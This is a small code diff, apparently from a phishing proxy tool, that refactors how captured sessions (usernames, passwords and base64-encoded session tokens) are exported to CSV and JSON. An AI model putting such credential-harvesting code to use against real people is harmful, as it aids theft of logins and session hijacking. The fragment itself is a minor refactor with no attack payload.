@@ -498,7 +498,7 @@ func (t *Terminal) handleSessions(args []string) error {
 						log.Error("%v", err)
 						break
 					}
-					base64tokens := base64.StdEncoding.EncodeToString([]byte(t.tokensToJSON(pl, s.Tokens)))
+					base64tokens := base64.StdEncoding.EncodeToString([]byte(tokensToJSON(pl, s.Tokens)))
 					wr.Write([]string{strconv.Itoa(s.Id), s.Phishlet, s.Username, s.Password, base64tokens, s.RemoteAddr, time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")})
 				}
 				wr.Flush()
@@ -525,7 +525,7 @@ func (t *Terminal) handleSessions(args []string) error {
 						Phishlet:   s.Phishlet,
 						Username:   s.Username,
 						Password:   s.Password,
-						Tokens:     base64.StdEncoding.EncodeToString([]byte(t.tokensToJSON(pl, s.Tokens))),
+						Tokens:     base64.StdEncoding.EncodeToString([]byte(tokensToJSON(pl, s.Tokens))),
 						RemoteAddr: s.RemoteAddr,
 						Time:       time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"),
 					}
